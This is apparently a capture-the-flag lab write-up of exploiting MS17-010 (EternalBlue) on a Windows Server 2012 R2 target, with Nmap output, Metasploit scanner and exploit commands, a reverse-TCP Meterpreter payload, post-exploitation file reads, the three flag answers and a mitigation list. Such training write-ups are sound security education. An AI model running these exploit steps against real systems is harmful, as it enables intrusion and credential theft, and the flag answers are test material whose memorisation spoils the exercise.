MS17-010 (EternalBlue) — Complete Walkthrough
Target Information

    Target IP: 10.49.153.52

    Attacker IP (Kali): 192.168.152.52

    Target OS: Windows Server 2012 R2 Datacenter 9600 x64

    Open Ports: 135 (MSRPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM)

Step 1: Reconnaissance

An Nmap scan of the target revealed the following open ports:
text

135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2012 R2 Datacenter 9600 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Port 445 (SMB) stands out as the highest-risk service. The target runs Windows Server 2012 R2, which is vulnerable to MS17-010 (EternalBlue) — a critical remote code execution vulnerability in SMBv1.
Step 2: Vulnerability Confirmation

Before launching the exploit, the vulnerability was confirmed using Metasploit's SMB scanner:
bash

msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.49.153.52
run

Output confirmed:
text

[+] 10.49.153.52:445 - Host is likely VULNERABLE to MS17-010!
    - Windows Server 2012 R2 Datacenter 9600 x64 (64-bit)
[+] 10.49.153.52:445 - The target is vulnerable.

Step 3: Exploitation

The EternalBlue exploit module was loaded and configured:
bash

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.49.153.52
set LHOST 192.168.152.52
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

After a brief period, a Meterpreter session opened:
text

[*] Sending stage (244806 bytes) to 10.49.153.52
[*] Meterpreter session 3 opened
    (192.168.152.52:4444 -> 10.49.153.52:49250)

Note: The exploit can be unstable on Server 2012 R2. In this walkthrough, one session died and the exploit had to be re-run. This is a known behavior of EternalBlue.
Step 4: Flag 1 — Access the Machine

Navigated to the root of the C: drive and read the first flag:
bash

meterpreter > cd C:/
meterpreter > cat flag1.txt

Flag 1: flag{access_the_machine}

Explanation: This flag confirms successful initial access to the target machine. It is placed at the root of the system drive.
Step 5: Flag 2 — SAM Database Location

The hint stated the flag is located "where passwords are stored within Windows." This refers to the SAM (Security Account Manager) database directory:
bash

meterpreter > cd C:/Windows/System32/config
meterpreter > ls
meterpreter > cat flag2.txt

Flag 2: flag{sam_database_elevated_access}

Explanation: The C:\Windows\System32\config\ directory contains the SAM, SYSTEM, and SECURITY registry hive files. The SAM file stores local user password hashes. Since Meterpreter was running as NT AUTHORITY\SYSTEM, direct access to this directory was possible. Attempting to read SAM.LOG1 failed because the file was locked by the OS — expected behavior since Windows keeps these files open.
Step 6: Flag 3 — Admin Documents

The third flag was located in a user's Documents folder:
bash

meterpreter > cd C:/Users/jon/Documents
meterpreter > ls
meterpreter > cat flag3.txt

Flag 3: flag{admin_documents_can_be_valuable}

Explanation: User Documents folders often contain sensitive information such as credentials, configuration files, or notes. This flag demonstrates that post-exploitation enumeration of user directories is a critical step — administrators frequently store valuable data in their personal folders.
Flag Summary
Flag	Path	Value
Flag 1	C:\flag1.txt	flag{access_the_machine}
Flag 2	C:\Windows\System32\config\flag2.txt	flag{sam_database_elevated_access}
Flag 3	C:\Users\jon\Documents\flag3.txt	flag{admin_documents_can_be_valuable}
Lessons Learned / Mitigation

    Patch MS17-010 immediately — Microsoft released the fix in March 2017 (MS17-010). Unpatched Windows Server 2012 R2 systems remain vulnerable to EternalBlue.

    Disable SMBv1 — SMBv1 is a legacy protocol with known critical vulnerabilities. Disable it via PowerShell: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

    Block port 445 at the perimeter — SMB should never be exposed to untrusted networks.

    Upgrade end-of-life systems — Windows Server 2012 R2 is no longer supported by Microsoft. Migrate to a supported version.

    Restrict RDP and WinRM access — Limit these management ports to trusted IP addresses only.

Tools Used

    Nmap — Port scanning and service enumeration

    Metasploit Framework — Exploitation (exploit/windows/smb/ms17_010_eternalblue)

    Meterpreter — Post-exploitation and flag retrieval

n details will be updated after the remaining task is completed.# AK_MEDUSA
